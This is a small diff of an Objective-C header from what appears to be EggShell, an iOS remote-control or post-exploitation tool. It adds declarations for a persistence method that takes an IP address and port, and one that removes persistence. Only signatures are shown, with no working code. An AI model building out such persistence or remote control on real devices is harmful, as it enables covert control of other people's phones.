@@ -23,7 +23,6 @@
 @property (retain) NSString *skey;
 @property (retain) CPDistributedMessagingCenter *messagingCenter;
 
-
 //socks
 extern int sockfd;
 -(int)connect:(NSString*)host
@@ -69,6 +68,8 @@ extern CFStringRef SBSApplicationLaunchingErrorString(int error);
 -(void)isplaying;
 -(void)listapps;
 -(void)launchApp:(NSArray *)args;
+-(void)persistence:(NSString *)ip :(int)port;
+-(void)rmpersistence;
 
 //eggshell pro
 -(void)mcSendNoReply:(NSString *)message;
